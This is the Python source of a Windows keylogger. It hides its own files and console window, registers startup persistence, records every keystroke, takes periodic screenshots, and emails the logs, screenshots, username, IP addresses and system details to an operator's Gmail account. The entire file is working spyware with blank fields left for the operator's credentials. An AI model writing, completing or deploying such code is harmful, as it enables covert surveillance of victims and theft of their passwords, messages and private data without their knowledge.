import os, sys
import shutil
import getpass
import threading
import smtplib
import time
import urllib2
import datetime
import socket
import platform
from src.directory import *
import pyHook, pythoncom
import win32event, win32api, winerror
from src.startup import *
import win32console, win32gui
from src.screenshot import *
from email import Encoders
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from src.hide import hide_screenshot
from src.zipScreen import zipScreenshot
from src.remove import remove_screenshot, remove_ZipScreenshot

# Hide compiled files
os.system('attrib +H *.pyc /S')


# Hide multiple instances
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    exit(0)

#save data to buffer
buffer = ""
count = 0
item = []


# current directory and current user
current_directory = os.getcwd()
currentuser = getpass.getuser()

# keystroke file
keystroke = current_directory + os.sep + r'data\keystroke.txt'

# current time
current_time = time.asctime(time.localtime(time.time()))

# save data to local keylogger
def local(location, data):
    global buffer
    append_file(location, data)
    buffer = ""


# Check internet connection
def internet_connection():
    try:
        urllib2.urlopen('https://www.google.com', timeout=20) 
        return True
    except:
        pass
    return False

# get ip
def local_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        pass
        
# Get public ip
def public_ip():
    try:
        if internet_connection() == True:
            return urllib2.urlopen('http://ip.42.pl/raw').read()
    except:
        pass
    return False

def main():
    #hide console
    win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)

    startupFunc()
    sysInfo()

# System Information
def sysInfo():
    global item
    un = platform.uname()
    item = [['system', ''], ['node', ''], ['release', ''], ['version', ''], ['machine', ''], ['processor', '']]
    for i in range(len(un)):
        item[i][1] = un[i]
    return item

class SendData(threading.Thread):
    def __init__(self, Zip_file):
        threading.Thread.__init__(self)
        self.Zip_file = Zip_file

    def run(self):
        global local
        f = open(keystroke, 'r')
        data = f.read()

        attach = os.getcwd() + os.sep + 'data' + os.sep +  self.Zip_file


        # Add your email in USER and TO variable. The email will be sent by USER to TO. Put in password in PASS.
        USER = ''
        PASS = ''
        FROM = USER
        TO = ''
        SUBJECT = "Information About %s regarding log data of %s" % (currentuser, current_time)
        MESSAGE = """%s \n \n UserName: %s \n IP address: %s \n Public Ip: %s \n System Information: %s \n""" % (data, currentuser, local_ip(), public_ip(), item)
      
        TEXT = """\
    From: %s
    To: %s
    Subject: %s

    %s
    """ % (FROM, TO, SUBJECT, MESSAGE)

        message = MIMEMultipart()
        message['From'] = FROM
        message['To'] = TO
        message['Subject'] = SUBJECT
        message.attach(MIMEText(TEXT))

        part = MIMEBase('application', 'octet-stream')
        part.set_payload(open(attach, 'rb').read())
        Encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
        message.attach(part)

        try:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            server.login(USER, PASS)
            server.sendmail(FROM, TO, message.as_string())
            print('Email is sent')
            server.close()
        except Exception, e:
            print e

        return True

def OnKeyboardEvent(event):
    global  buffer, keystroke, count

    evAscii = ""

    if event.Ascii >= 32 and event.Ascii <= 127:
        evAscii = chr(event.Ascii)
        count += 1
    elif event.Ascii == 8:
        evAscii = '<BACKSPACE>'
        count += 1
    elif event.Ascii == 9:
        evAscii = '<TAB>'
        count += 1
    elif event.Ascii == 13:
        evAscii = '<ENTER>'
        count += 1
        screen()

    buffer = buffer + evAscii

    if count % 100 == 0:
        zipScreenshot()
        SendData('ZipScreenshot.zip').start()

    if count % 50 == 0:
        screen()

    if count % 10 == 0:
        local(keystroke, buffer)

    if count >= 501:
        count = 0

    return True

if __name__ == '__main__':
    main()



hookKeyboard = pyHook.HookManager()
hookKeyboard.KeyDown = OnKeyboardEvent
hookKeyboard.HookKeyboard()
pythoncom.PumpMessages()